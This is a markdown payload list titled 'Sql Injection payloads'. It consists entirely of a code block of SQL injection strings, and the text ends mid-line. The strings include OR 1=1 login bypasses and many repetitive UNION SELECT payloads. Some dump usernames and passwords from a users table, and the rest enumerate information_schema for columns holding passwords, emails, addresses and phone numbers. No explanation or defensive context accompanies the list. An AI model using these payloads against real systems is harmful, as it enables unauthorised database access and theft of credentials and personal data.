# Sql Injection payloads

```bash
' OR 1=1; --
' OR 'a'='a'; --
' OR 'a'='a' UNION SELECT null, username, password FROM users; --
' OR 'a'='a' UNION SELECT null, table_name, null FROM information_schema.tables; --
' OR 'a'='a' UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name = 'users'; --
' OR 'a'='a' UNION SELECT null, CONCAT(username, ':', password), null FROM users; --
' OR 'a'='a' UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema != 'information_schema'; --
' OR 'a'='a' UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_schema != 'information_schema'; --
' OR 'a'='a' UNION SELECT null, CONCAT(username, ':', password), null FROM users WHERE id = 1; --
' OR 'a'='a' UNION SELECT null, CONCAT(table_name, ':', column_name), null FROM information_schema.columns WHERE table_schema != 'information_schema'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'users'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admins'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'settings'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'logs'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'sessions'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_users'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_settings'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_logs'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_sessions'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'users' AND table_schema != 'information_schema'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admins' AND table_schema != 'information_schema'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'settings' AND table_schema != 'information_schema'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'logs' AND table_schema != 'information_schema'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'sessions' AND table_schema != 'information_schema'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_users' AND table_schema != 'information_schema'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_settings' AND table_schema != 'information_schema'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_logs' AND table_schema != 'information_schema'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_sessions' AND table_schema != 'information_schema'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'users' AND column_name LIKE '%password%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admins' AND column_name LIKE '%password%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'settings' AND column_name LIKE '%password%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'logs' AND column_name LIKE '%password%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'sessions' AND column_name LIKE '%password%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_users' AND column_name LIKE '%password%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_settings' AND column_name LIKE '%password%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_logs' AND column_name LIKE '%password%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_sessions' AND column_name LIKE '%password%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'users' AND data_type LIKE '%varchar%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admins' AND data_type LIKE '%varchar%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'settings' AND data_type LIKE '%varchar%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'logs' AND data_type LIKE '%varchar%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'sessions' AND data_type LIKE '%varchar%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_users' AND data_type LIKE '%varchar%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_settings' AND data_type LIKE '%varchar%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_logs' AND data_type LIKE '%varchar%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_sessions' AND data_type LIKE '%varchar%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'users' AND data_type LIKE '%int%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admins' AND data_type LIKE '%int%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'settings' AND data_type LIKE '%int%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'logs' AND data_type LIKE '%int%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'sessions' AND data_type LIKE '%int%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_users' AND data_type LIKE '%int%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_settings' AND data_type LIKE '%int%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_logs' AND data_type LIKE '%int%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_sessions' AND data_type LIKE '%int%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'users' AND column_name LIKE '%email%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admins' AND column_name LIKE '%email%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'settings' AND column_name LIKE '%email%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'logs' AND column_name LIKE '%email%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'sessions' AND column_name LIKE '%email%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_users' AND column_name LIKE '%email%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_settings' AND column_name LIKE '%email%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_logs' AND column_name LIKE '%email%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_sessions' AND column_name LIKE '%email%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'users' AND column_name LIKE '%date%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admins' AND column_name LIKE '%date%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'settings' AND column_name LIKE '%date%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'logs' AND column_name LIKE '%date%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'sessions' AND column_name LIKE '%date%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_users' AND column_name LIKE '%date%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_settings' AND column_name LIKE '%date%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_logs' AND column_name LIKE '%date%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_sessions' AND column_name LIKE '%date%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'users' AND column_name LIKE '%address%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admins' AND column_name LIKE '%address%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'settings' AND column_name LIKE '%address%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'logs' AND column_name LIKE '%address%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'sessions' AND column_name LIKE '%address%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_users' AND column_name LIKE '%address%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_settings' AND column_name LIKE '%address%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_logs' AND column_name LIKE '%address%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_sessions' AND column_name LIKE '%address%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'users' AND column_name LIKE '%phone%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admins' AND column_name LIKE '%phone%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'settings' AND column_name LIKE '%phone%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'logs' AND column_name LIKE '%phone%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'sessions' AND column_name LIKE '%phone%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_users' AND column_name LIKE '%phone%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type), null FROM information_schema.columns WHERE table_name = 'admin_settings' AND column_name LIKE '%phone%'; --
' OR 'a'='a' UNION SELECT null, CONCAT(column_name, ':', data_type),
```
